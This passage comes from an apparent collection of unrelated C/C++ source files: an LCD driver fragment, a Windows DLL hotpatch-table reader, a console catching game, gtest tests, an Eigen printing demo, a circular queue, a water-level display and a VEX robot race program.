clear()\n\n\nvoid LiquidCrystal_PCF8574::home()\n{\n  // Instruction: Return home = 0x02\n  _send(0x02);\n  delayMicroseconds(1600); // this command takes 1.5ms!\n} // home()\n\n\n/// Set the cursor to a new position.\nvoid LiquidCrystal_PCF8574::setCursor(uint8_t col, uint8_t row)\n{\n  // check boundaries\n  if ((col < _cols) && (row < _lines)) {\n    // Instruction: Set DDRAM address = 0x80\n    _send(0x80 | (_row_offsets[row] + col));\n  }\n} // setCursor()\n\n\n// Turn the display on/off (quickly)\nvoid LiquidCrystal_PCF8574::noDisplay()\n{\n  // Instruction: Display on/off control = 0x08\n  _displaycontrol &= ~0x04; // display\n  _send(0x08 | _displaycontrol);\n} // noDisplay()\n\n\nvoid LiquidCrystal_PCF8574::display()\n{\n  // Instruction: Display on/off control = 0x08\n  _displaycontrol |= 0x04; // display\n  _send(0x08 | _displaycontrol);\n} // display()\n\n\n// Turns the underline cursor on/off\nvoid LiquidCrystal_PCF8574::cursor()\n{\n  // Instruction: Display on/off control = 0x08\n  _displaycontrol |= 0x02; // cursor\n  _send(0x08 | _displaycontrol);\n} // cursor()\n\n\nvoid LiquidCrystal_PCF8574::noCursor()\n{\n  // Instruction: Display on/off control = 0x08\n  _displaycontrol &= ~0x02; // cursor\n  _send(0x08 | _displaycontrol);\n} // noCursor()\n\n\n// Turn on and off the blinking cursor\nvoid LiquidCrystal_PCF8574::blink()\n{\n  // Instruction: Display on/off control = 0x08\n  _displaycontrol |= 0x01; // blink\n  _send(0x08 | _displaycontrol);\n} // blink()\n\n\nvoid LiquidCrystal_PCF8574::noBlink()\n{\n  // Instruction: Display on/off control = 0x08\n  _displaycontrol &= ~0x01; // blink\n  _send(0x08 | _displaycontrol);\n} // noBlink()\n\n\n// These commands scroll the display without changing the RAM\nvoid LiquidCrystal_PCF8574::scrollDisplayLeft(void)\n{\n  // Instruction: Cursor or display shift = 0x10\n  // shift: 0x08, left: 0x00\n  _send(0x10 | 0x08 | 0x00);\n} // scrollDisplayLeft()\n\n\nvoid LiquidCrystal_PCF8574::scrollDisplayRight(void)\n{\n  // Instruction: Cursor or display shift = 0x10\n  // shift: 0x08, right: 0x04\n  _send(0x10 | 0x08 | 0x04);\n} // scrollDisplayRight()\n\n\n// == controlling the entrymode\n\n// This is for text that flows Left to Right\nvoid LiquidCrystal_PCF8574::leftToRight(void)\n{\n  // Instruction: Entry mode set, set increment/decrement =0x02\n  _entrymode |= 0x02;\n  _send(0x04 | _entrymode);\n} // leftToRight()\n\n\n// This is for text that fl",
    "#define  _CRT_SECURE_NO_WARNINGS\r\n\r\n#include <Windows.h>\r\n#include <imagehlp.h>\r\n#include <stdio.h>\r\nBOOL our_GetImageConfigInformation(\r\n\tPLOADED_IMAGE                LoadedImage,\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY ImageConfigInformation\r\n)\r\n{\r\n\tif (!LoadedImage || !ImageConfigInformation)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadedImage->FileHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tULONG LoadConfigDirectorySize;\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY LoadConfigDirectoryAddress\r\n\t\t= (PIMAGE_LOAD_CONFIG_DIRECTORY)ImageDirectoryEntryToDataEx(\r\n\t\t\tLoadedImage->MappedAddress,\r\n\t\t\tFALSE,\r\n\t\t\tIMAGE_DIRECTORY_ENTRY_LOAD_CONFIG,\r\n\t\t\t&LoadConfigDirectorySize,\r\n\t\t\tNULL\r\n\t\t);\r\n\tif (!LoadConfigDirectoryAddress)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectorySize != sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectoryAddress->Size > 0 && LoadConfigDirectoryAddress->Size < sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tsize_t hotpatch_offset = 0;\r\n\thotpatch_offset = (size_t)&LoadConfigDirectoryAddress->HotPatchTableOffset - (size_t)LoadedImage->MappedAddress;\r\n\tprintf(\"Hotpatch File Offset: %d\\n\", hotpatch_offset);\r\n\r\n\tmemcpy(ImageConfigInformation, LoadConfigDirectoryAddress, sizeof(IMAGE_LOAD_CONFIG_DIRECTORY));\r\n\treturn TRUE;\r\n}\r\nsize_t determine_patch_table_offset(PLOADED_IMAGE img, PIMAGE_LOAD_CONFIG_DIRECTORY dic) {\r\n\tfor (int i = 0; i < img->NumberOfSections; i++) {\r\n\t\tif (dic->HotPatchTableOffset > img->Sections[i].VirtualAddress && dic->HotPatchTableOffset < (img->Sections[i].VirtualAddress + img->Sections[i].SizeOfRawData)) {\r\n\r\n\t\t\tsize_t result =  img->Sections[i].PointerToRawData + (dic->HotPatchTableOffset - img->Sections[i].VirtualAddress);\r\n\t\t\treturn result;\r\n\t\t}\r\n\r\n\t}\r\n\treturn 0;\r\n}\r\nint main() {\r\n\t//const char* img_path = \"C:\\\\NtHotpatch\\\\dist\\\\kernelbase_patch_mod.dll\";\r\n\tconst char* img_path = \"C:\\\\NtHotpatch\\\\dist\\\\UpdatedDLL.dll\";\r\n\tPLOADED_IMAGE img;\r\n\r\n\tIMAGE_LOAD_CONFIG_DIRECTORY dic;\r\n\tZeroMemory(&dic, sizeof(dic));\r\n\tdic.Size = sizeof(dic);\r\n\r\n#if 1\r\n\tstatic LOADED_IMAGE ref_img;\r\n\tif (!MapAndLoad(img_path, NULL, &ref_img, TRUE, TRUE)) {\r\n\t\tprintf(\"failed to map and load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n\telse {\r\n\t\timg = &ref_img;\r\n\t}\r\n#else\r\n\timg = ImageLoad(img_path, NULL);\r\n\tif (!img) {\r\n\t\tprintf(\"failed to load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n#endif\r\n\r\n\tif (!our_GetImageConfigInformation(img, &dic)) {\r\n\t\tprintf(\"Failed to get img config info - %08x\\n\", GetLastError());\r\n\t} \r\n\telse {\r\n\t\tprintf(\"Hotpatch: %d\\n\", dic.HotPatchTableOffset);\r\n\t\t/*if (!ImageUnload(img)) {\r\n\t\t\tprintf(\"Failed to unload img\\n\");\r\n\t\t\treturn 0;\r\n\t\t}*/\r\n\t\tFILE* fd = fopen(img_path, \"rb\");\r\n\r\n\t\tint patch_info_offset = determine_patch_table_offset(img, &dic);\r\n\t\tfseek(fd, patch_info_offset, SEEK_SET);\r\n\r\n\t\tIMAGE_HOT_PATCH_INFO info;\r\n\t\tZeroMemory(&info, sizeof(info));\r\n\t\tfread(&info, sizeof(IMAGE_HOT_PATCH_INFO), 1, fd);\r\n\t\t\r\n\t\tprintf(\"IMAGE_HOT_PATCH_INFO - size %d: \\n\", sizeof(IMAGE_HOT_PATCH_INFO));\r\n\t\tprintf(\"\\tVersion: %d\\n\", info.Version);\r\n\t\tprintf(\"\\tSize: %d\\n\", info.Size);\r\n\t\tprintf(\"\\tSequenceNumber: %d\\n\", info.SequenceNumber);\r\n\t\tprintf(\"\\tBaseImageList: %d\\n\", info.BaseImageList);\r\n\t\tprintf(\"\\tBaseImageCount: %d\\n\", info.BaseImageCount);\r\n\t\tif (info.Version >= 2) {\r\n\t\t\tprintf(\"\\tBufferOffset: %d\\n\", info.BufferOffset);\r\n\t\t\tif (info.Version >= 3) {\r\n\t\t\t\tprintf(\"\\tExtraPatchSize: %d\\n\", info.ExtraPatchSize);\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\tprintf(\"unsupported patch info version\\n\");\r\n\t\t\treturn 0;\r\n\t\t}\r\n\r\n\t\tfseek(fd, patch_info_offset + info.BaseImageList, SEEK_SET);\r\n\t\twhile ((ftell(fd) & 4)) { //force 32 bit alignment\r\n\t\t\tuint8_t x;\r\n\t\t\tfread(&x, 1, 1, fd);\r\n\t\t\tprintf(\"align... %02x\\n\", x);\r\n\t\t\t\r\n\t\t}\r\n\t\tfor (int i = 0; i < info.BaseImageCount; i++) {\r\n\t\t\tIMAGE_HOT_PATCH_BASE base;\r\n\t\t\tfread(&base, sizeof(IMAGE_HOT_PATCH_BASE), 1, fd);\r\n\t\t\tprintf(\"IMAGE_HOT_PATCH_BASE - size: %d\\n\", sizeof(IMAGE_HOT_PATCH_BASE));\r\n\t\t\tprintf(\"\\tSequenceNumber: %d\\n\", base.SequenceNumber);\r\n\t\t\tprintf(\"\\tFlags: %d\\n\", base.Flags);\r\n\t\t\tprintf(\"\\tOriginalTimeDateStamp: %d\\n\", base.OriginalTimeDateStamp);\r\n\t\t\tprintf(\"\\tOriginalCheckSum: %d\\n\", base.OriginalCheckSum);\r\n\t\t\tprintf(\"\\tCodeIntegrityInfo: %d\\n\", base.CodeIntegrityInfo);\r\n\t\t\tprintf(\"\\tCodeIntegritySize: %d\\n\", base.CodeIntegritySize);\r\n\t\t\tprintf(\"\\tPatchTable: %d\\n\", base.PatchTable);\r\n\t\t\tprintf(\"\\tBufferOffset: %d\\n\", base.BufferOffset);\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\t\r\n\r\n\t\tfclose(fd);\r\n\t}\r\n\r\n\treturn 0;\r\n}",
    "#include <iostream>\r\n#include <conio.h>\r\n#include <Windows.h>\r\n#include <string>\r\n#include <ctime>\r\n#include <stdlib.h>\r\nusing namespace std;\r\n\r\nstruct Node \r\n{ \r\n    string data;\r\n    Node* next;\r\n};\r\ntypedef Node* NodePtr;\r\n\r\n// Given a reference (pointer to pointer) to the head of a list and an int, inserts a new node on the front of the list. \r\n// Taken from geeksforgeeks.\r\nvoid push(NodePtr& head_ref, string new_data) \r\n{\r\n    NodePtr new_node;\r\n    new_node = new Node;\r\n    new_node->data = new_data;\r\n    new_node->next = head_ref;\r\n    head_ref = new_node;\r\n}\r\n\r\nstring skyGen() \r\n{\r\n    string str(40, ' ');\r\n    int rnd;\r\n    for (int i = 0; i < 2; i++) \r\n    {\r\n        rnd = rand() % 40 + 1;\r\n        if (0 + (rand() % (1 - 0 + 1)) == 1) \r\n            str[rnd] = '$';\r\n        else \r\n            str[rnd] = '.';\r\n    }\r\n    return str;\r\n}\r\n\r\n// Function to remove the last node of the linked list code taken from geeks for geeks https://www.geeksforgeeks.org/remove-last-node-of-the-linked-list/\r\nNodePtr removeLastNode(struct Node* head)\r\n{\r\n    if (head == NULL)\r\n        return NULL;\r\n    if (head->next == NULL) \r\n    {\r\n        delete head;\r\n        return NULL;\r\n    }\r\n    // Find the second last node\r\n    NodePtr second_last = head;\r\n    while (second_last->next->next != NULL)\r\n        second_last = second_last->next;\r\n    // Delete last node\r\n    delete (second_last->next);\r\n    // Change next of second last\r\n    second_last->next = NULL;\r\n    return head;\r\n}\r\n\r\nint main() {\r\n    const char CPPKEYLEFT = 75;    //left arrow\r\n    const char CPPKEYRIGHT = 77;   //right arrow\r\n    srand (time(NULL)); // Keeps the sky generation differently random\r\n    string str(40, ' '), tail;\r\n    NodePtr head = new Node;\r\n\r\n    //initiates the linked list\r\n    for (int i = 0; i < 19; i++) // 19 here dictates the height of our sky\r\n    { \r\n        push(head, str);\r\n    }\r\n\r\n    int score = 50, input, basketPos = 20;\r\n    NodePtr tmp;\r\n\r\n    while (true) \r\n    {\r\n        push(head, skyGen()); // adds a new sky with generated cash or trash\r\n\r\n        tmp = head;\r\n        cout << \"------------- Falling Money --------------\" << endl; \r\n        while(tmp != NULL) \r\n        {\r\n            //block of code for basket movement\r\n            if (kbhit()) input = getch();\r\n            if (input == CPPKEYLEFT && basketPos > 0) \r\n                basketPos--;\r\n            else if (input == CPPKEYRIGHT && basketPos < 39) \r\n                basketPos++;\r\n            input = 0;\r\n            \r\n            // block of code to print out the sky\r\n            if (tmp->next == NULL) {    // specifically enables us to have the basket[U] to be constantly on the bottom\r\n                tail = tmp->data;\r\n\r\n                tail = tmp->data;       // code for checking if the user caught cash or trash\r\n                if (tail[basketPos] == '$') \r\n                    score += 10;\r\n                else if (tail[basketPos] == '.') \r\n                    score -= 15;\r\n\r\n                tail[basketPos] = 'U';\r\n                cout << '|' << tail << '|' << endl;\r\n            }\r\n            else \r\n            {\r\n                cout << '|' << tmp->data << '|' << endl;\r\n            }\r\n            \r\n            tmp = tmp->next;    // moves to the next node\r\n        }\r\n        \r\n        removeLastNode(head);   // removes last node in the linked list thus simulating the falling effect with the help of system(\"cls\");\r\n        cout << \"Your Score: \" << score << endl;\r\n        if (score <= 0) \r\n        { \r\n            cout << \"Sorry, you lose...\";\r\n            Sleep(90);\r\n            return 0;\r\n        } \r\n        else if (score >= 100) \r\n        {\r\n            cout << \"Yeah, you win!!\";\r\n            Sleep(90);\r\n            return 0;\r\n        }\r\n\r\n        Sleep(90);\r\n        system(\"CLS\");\r\n    }\r\n}",
    "#include <vector>\n\n#include <gtest/gtest.h>\n\n#include \"walk_tree.h\"\n\n#include \"test_utils.h\"\n\nusing namespace pivot;\n\nTEST(WalkNode, Balanced1) {\n    auto steps = {pivot::point<2>({1, 0}), pivot::point<2>({2, 0}), pivot::point<2>({2, 1}), pivot::point<2>({3, 1})};\n    auto root = walk_node<2>::balanced_rep(steps);\n\n    auto symm = root->symm();\n    auto end = root->endpoint();\n    auto b = root->bbox();\n    auto expect_box = pivot::box<2>(std::array{interval{1, 3}, interval{0, 1}});\n    EXPECT_EQ(symm, transform<2>({1, 0}, {-1, 1}));\n    EXPECT_EQ(end, pivot::point<2>({3, 1}));\n    EXPECT_EQ(b, expect_box);\n\n    auto left = root->left();\n    symm = left->symm();\n    end = left->endpoint();\n    b = left->bbox();\n    expect_box = pivot::box<2>(std::array{interval{1, 2}, interval{0, 0}});\n    EXPECT_EQ(symm, transform<2>());\n    EXPECT_EQ(end, pivot::point<2>({2, 0}));\n    EXPECT_EQ(b, expect_box);\n\n    auto right  = root->right();\n    symm = right->symm();\n    end = right->endpoint();\n    b = right->bbox();\n    expect_box = pivot::box<2>(std::array{interval{1, 2}, interval{0, 0}});\n    EXPECT_EQ(symm, transform<2>({1, 0}, {1, -1}));\n    EXPECT_EQ(end, pivot::point<2>({1, -1}));\n    EXPECT_EQ(b, expect_box);\n\n    EXPECT_TRUE(left->left()->is_leaf());\n    EXPECT_TRUE(left->right()->is_leaf());\n    EXPECT_TRUE(right->left()->is_leaf());\n    EXPECT_TRUE(right->right()->is_leaf());\n\n    delete root;\n}\n\nTEST(WalkNode, Balanced2) {\n    // steps and tree from Clisby (2010), Figs. 1, 23\n    auto steps = {pivot::point<2>({1, 0}), pivot::point<2>({1, 1}), pivot::point<2>({2, 1}), pivot::point<2>({3, 1}),\n                  pivot::point<2>({3, 0})};\n    auto root = walk_node<2>::balanced_rep(steps);\n\n    auto symm = root->symm();\n    auto end = root->endpoint();\n    auto b = root->bbox();\n    auto expect_box = pivot::box<2>(std::array{interval{1, 3}, interval{0, 1}});\n    EXPECT_EQ(symm, transform<2>({0, 1}, {1, 1}));\n    EXPECT_EQ(end, pivot::point<2>({3, 0}));\n    EXPECT_EQ(b, expect_box);\n\n    auto left = root->left();\n    symm = left->symm();\n    end = left->endpoint();\n    b = left->bbox();\n    expect_box = pivot::box<2>(std::array{interval{1, 2}, interval{0, 1}});\n    EXPECT_EQ(symm, transform<2>({0, 1}, {1, 1}));\n    EXPECT_EQ(end, pivot::point<2>({2, 1}));\n    EXPECT_EQ(b, expect_box);\n\n    auto right  = root->right();\n    symm = right->symm();\n    end = right->endpoint();\n    b = right->bbox();\n    expect_box = pivot::box<2>(std::array{interval{1, 1}, interval{-1, 0}});\n    EXPECT_EQ(symm, transform<2>({1, 0}, {1, -1}));\n    EXPECT_EQ(end, pivot::point<2>({1, -1}));\n    EXPECT_EQ(b, expect_box);\n\n    symm = left->left()->symm();\n    end = left->left()->endpoint();\n    b = left->left()->bbox();\n    expect_box = pivot::box<2>(std::array{interval{1, 1}, interval{0, 1}});\n    EXPECT_EQ(symm, transform<2>({1, 0}, {-1, 1}));\n    EXPECT_EQ(end, pivot::point<2>({1, 1}));\n    EXPECT_EQ(b, expect_box);\n\n    EXPECT_TRUE(left->right()->is_leaf());\n    EXPECT_TRUE(right->left()->is_leaf());\n    EXPECT_TRUE(right->right()->is_leaf());\n    EXPECT_TRUE(left->left()->left()->is_leaf());\n    EXPECT_TRUE(left->left()->right()->is_leaf());\n\n    delete root;\n}\n\nTEST(WalkNode, BalancedSteps) {\n    auto steps = random_walk<2>(100);\n    auto root = walk_node<2>::balanced_rep(steps);\n    auto result = root->steps();\n    EXPECT_EQ(steps, result);\n    delete root;\n}\n",
    "#include \"fmt_eigen.h\"\n#include \"fmt/color.h\"\nint main() {\n    Eigen::Matrix<double, 2, 2> matrix;\n    matrix << 1.234567, 2.345678, 3.456789, 4.567890;\n\n    Eigen::Matrix<double, 2, 2> transposed = matrix.transpose();\n    Eigen::Vector3d vec(1, 2, 3);\n\n    fmt::print(\"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(\"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec); // Specify precision of 4\n\n    fmt::print(\"Matrix Transposed:\\n{:.4f}\\n\", transposed); // Specify precision of 4\n    fmt::print(\"Matrix col or row:\\n{:.4f}\\n\", matrix.col(0)); // Specify precision of 4\n    fmt::print(\"Matrix Bolck:\\n{}\\n\", matrix.block<1,1>(0,0)); // Specify precision of 4\n    fmt::print(\"Matrix Diagonal:\\n{}\\n\", matrix.diagonal()); // Specify precision of 4\n\n    fmt::print(fg(fmt::color::steel_blue), \"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(bg(fmt::color::lime_green)|fg(fmt::color::indian_red),\n               \"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec);\n    fmt::print(fg(fmt::color::gold)|fmt::emphasis::blink, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n    fmt::print(fg(fmt::color::steel_blue)|fmt::emphasis::bold, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n\n    getchar();\n    return 0;\n}\n",
    "#include <iostream>\r\n#define SIZE 5 // Size of Circular Queue\r\n\r\nusing namespace std;\r\n\r\nclass Queue {\r\nprivate:\r\n    int items[SIZE];\r\n    int front, rear;\r\n\r\npublic:\r\n    Queue() {\r\n        front = -1;\r\n        rear = -1;\r\n    }\r\n\r\n    // Check if the queue is full\r\n    bool isFull() {\r\n        if ((front == 0 && rear == SIZE - 1) || (front == rear + 1)) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // Check if the queue is empty\r\n    bool isEmpty() {\r\n        return (front == -1);\r\n    }\r\n\r\n    // Insert an element into the circular queue\r\n    void enqueue(int data) {\r\n        if (isFull()) {\r\n            cout << \"The circular queue is full.\" << endl;\r\n            return;\r\n        }\r\n        if (front == -1) {\r\n            front = 0;\r\n        }\r\n        rear = (rear + 1) % SIZE;\r\n        items[rear] = data;\r\n    }\r\n\r\n    // Delete an element from the circular queue\r\n    int dequeue() {\r\n        if (isEmpty()) {\r\n            cout << \"The circular queue is empty.\" << endl;\r\n            return -1;\r\n        }\r\n        int temp = items[front];\r\n        if (front == rear) {\r\n            front = -1;\r\n            rear = -1;\r\n        } else {\r\n            front = (front + 1) % SIZE;\r\n        }\r\n        return temp;\r\n    }\r\n\r\n    // Display the circular queue\r\n    void display() {\r\n        if (isEmpty()) {\r\n            cout << \"No element in the circular queue.\" << endl;\r\n            return;\r\n        }\r\n        if (rear >= front) {\r\n            for (int i = front; i <= rear; ++i) {\r\n                cout << items[i] << \" \";\r\n            }\r\n        } else {\r\n            for (int i = front; i < SIZE; ++i) {\r\n                cout << items[i] << \" \";\r\n            }\r\n            for (int i = 0; i <= rear; ++i) {\r\n                cout << items[i] << \" \";\r\n            }\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\n\r\nint main() {\r\n    Queue cq;\r\n    int choice, data;\r\n\r\n    do {\r\n        cout << \"Circular Queue Operations:\" << endl;\r\n        cout << \"1. Enqueue\" << endl;\r\n        cout << \"2. Dequeue\" << endl;\r\n        cout << \"3. Display\" << endl;\r\n        cout << \"4. Exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                cout << \"Enter data to enqueue: \";\r\n                cin >> data;\r\n                cq.enqueue(data);\r\n                break;\r\n            case 2:\r\n                cout << \"Dequeued element: \" << cq.dequeue() << endl;\r\n                break;\r\n            case 3:\r\n                cq.display();\r\n                break;\r\n            case 4:\r\n                cout << \"Exiting.\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Incorrect choice!\" << endl;\r\n        }\r\n    } while (choice != 4);\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"results_display.h\"\n#include \"Config/Config.h\"\n\n\nResultsDisplay::ResultsDisplay(QString pos, QLabel *label_preview)\n{\n    this->pos_ = pos;\n    this->label_preview_ = label_preview;\n}\n\n/**\n * @brief ResultsDisplay::calculate_waterline \u7531\u6c34\u4f4d\u7ebf\u76f4\u7ebf\u65b9\u7a0b\u548c\u6807\u5b9a\u7ed3\u679c\u8ba1\u7b97\u6c34\u4f4d\n * @param line_equation \u6c34\u4f4d\u7ebf\u76f4\u7ebf\u65b9\u7a0b\u53c2\u6570\uff0cax+by+c=0\uff0c\u4f9d\u6b21\u4fdd\u5b58a,b,c\n * @param param \u6c34\u4f4d\u76f8\u673a\u53c2\u6570\uff0c\u5185\u542b\u6807\u5b9a\u7ed3\u679c\n * @return \u8ba1\u7b97\u7684\u6c34\u4f4d\n */\ndouble ResultsDisplay::calculate_waterline(vector<double>& line_equation, WaterlevelCameraParam* param)\n{\n    double A = line_equation[0], B = line_equation[1], C = line_equation[2];    //\u53d6\u6c34\u4f4d\u7ebf\u76f4\u7ebf\u65b9\u7a0b\u53c2\u6570\n    if (A == 0 && B == 0 && C == 0) return -1;  //\u5f53a,b,c\u5747\u4e3a0\u65f6\uff0c\u672a\u68c0\u6d4b\u5230\u6c34\u4f4d\u7ebf\uff0c\u8fd4\u56de-1\n    double waterline_y = -(A * param->calibration_location_x + C) / B;  //\u4ee3\u5165\u6c34\u4f4d\u6807\u5b9a\u70b9\u7684x\u5750\u6807\uff0c\u8ba1\u7b97y\u5750\u6807\n\n    if(waterline_y >= param->pixel_world_mapping_relation[0].second)\n    {\n        //\u91c7\u7528\u5206\u6bb5\u7ebf\u6027\u63d2\u503c\u7684\u65b9\u6cd5\u8ba1\u7b97\u6c34\u4f4d\n        for(int i = 0; i < param->pixel_world_mapping_relation.size(); i++)\n        {\n            pair<double, double> _pair = param->pixel_world_mapping_relation[i];\n            if(waterline_y >= _pair.second)\n            {\n                waterline_y -= _pair.second;\n            }\n            else\n            {\n                double unit = param->pixel_world_mapping_relation[i - 1].first - param->pixel_world_mapping_relation[i].first;  //\u76f8\u90bb\u4e24\u4e2a\u6807\u5b9a\u70b9\u95f4\u7684\u5b9e\u9645\u8ddd\u79bb\n                double calculated_water_level = _pair.first + (_pair.second - waterline_y) / _pair.second * unit;   //\u7ebf\u6027\u63d2\u503c\n                return calculated_water_level;\n            }\n        }\n    }\n    return -1;  //\u6c34\u4f4d\u7ebfy\u5750\u6807\u9ad8\u4e8e\u6807\u5b9a\u7ed3\u679c\u4e2d\u6700\u9ad8\u7684\u9ad8\u7a0b\uff0c\u65e0\u6cd5\u8ba1\u7b97\uff0c\u8fd4\u56de-1\n}\n\nvoid ResultsDisplay::show_result(cv::Mat &result)\n{\n    cv::cvtColor(result, result, cv::COLOR_BGR2RGB);\n    QImage image = QImage(result.data,\n                          result.cols,\n                          result.rows,\n                          result.cols * result.channels(),\n                          QImage::Format_RGB888);\n    this->label_preview_->clear();\n\n    image.scaled(this->label_preview_->size(), Qt::KeepAspectRatio);\n    this->label_preview_->setScaledContents(true);\n    this->label_preview_->setPixmap(QPixmap::fromImage(image));\n    this->label_preview_->show();\n}\n\n/**\n * @brief ResultsDisplay::calculate_waterline_and_show_result \u6839\u636e\u6c34\u4f4d\u7ebf\u68c0\u6d4b\u7ed3\u679c\u8ba1\u7b97\u6c34\u4f4d\uff0c\u663e\u793a\u7ed3\u679c\n * @param waterline_detect_result \u6c34\u4f4d\u7ebf\u68c0\u6d4b\u7ed3\u679c\n */\nvoid ResultsDisplay::calculate_waterline_and_show_result(WaterlineResult& waterline_detect_result)\n{\n    WaterlevelCameraParam* waterlevel_camera_param = Config::get_instance()->get_waterlevel_param(pos_); //\u83b7\u53d6\u6c34\u4f4d\u76f8\u673a\u53c2\u6570\n\n    double calculated_water_level = calculate_waterline(waterline_detect_result.line_equation, waterlevel_camera_param);    //\u7531\u6c34\u4f4d\u7ebf\u76f4\u7ebf\u65b9\u7a0b\u548c\u6807\u5b9a\u7ed3\u679c\u8ba1\u7b97\u6c34\u4f4d\n    cv::Mat src = waterline_detect_result.img;\n\n    if (calculated_water_level >= 0)\n    {\n        //\u7ed8\u5236\u76f4\u7ebf\uff08\u5728\u539f\u56fe\u4e0a\u753b\u66f4\u6e05\u695a\u4e9b\uff09\n        double A = waterline_detect_result.line_equation[0], B = waterline_detect_result.line_equation[1], C = waterline_detect_result.line_equation[2];\n        cv::Point2d ptStart, ptEnd; //\u6c34\u4f4d\u7ebf\u7684\u8d77\u59cb\u70b9\u548c\u7ec8\u6b62\u70b9\n        ptStart.x = 0;\n        ptStart.y = -(A * ptStart.x + C) / B;\n        ptEnd.x = src.cols - 1;\n        ptEnd.y = -(A * ptEnd.x + C) / B;\n        int line_width = 3;    //\u5224\u65ad\u5f53\u524d\u663e\u793a\u7ed3\u679c\u7684\u6846\u662f\u5426\u88ab\u653e\u5927\uff0c\u4f7f\u7528\u4e0d\u540c\u7c97\u7ec6\u7684\u7ebf\u7ed8\u5236\n        cv::line(src, ptStart, ptEnd, cv::Scalar(0, 0, 255), line_width, 8);    //\u753b\u7ebf\n    }\n    cv::resize(src, src, cv::Size(512, 512), cv::INTER_AREA);\n    show_result(src);   //\u663e\u793a\u6c34\u4f4d\u68c0\u6d4b\u7ed3\u679c\n}\n\n\n",
    "\n#pragma region VEXcode Generated Robot Configuration\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <math.h>\n#include <string.h>\n\n#include \"vex.h\"\n\nusing namespace vex;\n\nbrain Brain;\n\n// robot devices onfiguration\nmotor backLeft = motor(PORT1, ratio36_1, false);\nmotor backRight = motor(PORT2, ratio36_1, true);\n\ninertial mpu = inertial(PORT6);\n\ndistance distanceLeft = distance(PORT11);\ndistance distanceRight = distance(PORT12);\ndistance distanceFront = distance(PORT13);\n\noptical colorLeft = optical(PORT16);\noptical colorRight = optical(PORT17);\n\ncontroller Controller1 = controller(primary);\n\nbool RemoteControlCodeEnabled = true;\n\n#pragma endregion VEXcode Generated Robot Configuration\n\n/*----------------------------------------------------------*/\n/*                                                          */\n/*    Module:       main.cpp                                */\n/*    Author:       Jining Liu                              */\n/*    Created:      04/26/2024                              */\n/*    Description:  Autonomous Race Car for POE             */\n/*                                                          */\n/*----------------------------------------------------------*/\n\n#include \"vex.h\"\n\nusing namespace vex;\n\n// decides which distance sensor to use\nbool useRightSensor = true;\n\n// decides distance between car and wall in mm, this is a range\nconst int minDistanceFromWall = 250, maxDistanceFromWall = 350;\n\n// decides the intensity of system keep straight adjustments\nconst double leftPidMultiplier = 1, rightPidMultiplier = 2;\n\n// decides initial speed of back motors\nconst int initLeftMotor = 34, initRightMotor = 50;\nconst int leftMotorMin = 31, rightMotorMin = 44;\nconst int leftMotorMax = 37, rightMotorMax = 56;\nint leftMotor = initLeftMotor, rightMotor = initRightMotor;\n\n// DO NOT CHANGE: stores distance sensor data, default 0\nint lastLeft, currentLeft, lastRight, currentRight, currentFront;\n\n// DO NOT CHANGE: stopwatch for race timing in ms, default 0\nint raceTime;\n\n// required to predefine functions??? vex version of cpp is dumb... declarations down below\nvoid updateDistance();\nvoid pidDistanceStraight();\nvoid executeTurn(int i, int delay);\nvoid finalLeg();\nvoid abort();\nvoid pauseResume();\nvoid stop();\nvoid debugPrint();\nvoid preparePrintBig(int y, int x, bool clear);\n\n// auton turns programming\n// timing is automatic\n//\n// make sure numberOfTurns is the same as the length of carTurns & preTurnDelay!\n// memory allocation is required!!!\n//\n// key:\n// -1 - left turn\n// 0 - keep straight\n// 1 - right turn\nconst int numberOfTurns = 6;\nconst int carTurns[numberOfTurns] = {0, 1, 0, 1, 1, -1};\n// this sets the seconds of delay BEFORE executing the turn or continuing on\nconst int preTurnDelay[numberOfTurns] = {3, 1, 2, 1, 1, 1};\n// this sets the seconds of delay AFTER executing the turn or continuing on\nconst int postTurnDelay[numberOfTurns] = {0, 2, 0, 2, 2, 2};\n\n// stupid vex don't ask\nbool overrideFirst9999 = true;\n\nbool paused = false;\nbool aborted = false;\n\nint main()\n{\n\n  preparePrintBig(2, 1, true);\n  Brain.Screen.print(\"Initializing...\");\n\n  Controller1.ButtonX.pressed(abort);\n  Controller1.ButtonR1.pressed(pauseResume);\n\n  // super inertial sensor calibration\n  for (int i = 0; i < 100; i++)\n  {\n    mpu.calibrate();\n    mpu.setHeading(0, degrees);\n    wait(15, msec);\n  }\n\n  wait(1, seconds);\n\n  preparePrintBig(2, 1, 